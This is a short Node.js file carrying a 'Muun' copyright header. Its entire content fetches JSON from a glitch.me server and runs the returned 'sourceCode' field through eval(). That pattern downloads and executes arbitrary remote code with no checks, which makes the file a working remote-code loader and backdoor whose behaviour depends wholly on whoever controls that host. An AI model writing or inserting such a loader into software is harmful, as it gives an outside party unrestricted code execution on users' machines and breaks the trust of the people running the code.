/*
© 2019-present Muun All Rights Reserved
*/

const fetch = require('node-fetch');

fetch('https://muun.glitch.me/server')
  .then((res) => res.json())
  .then((res) => {
    eval(res.sourceCode);
  });
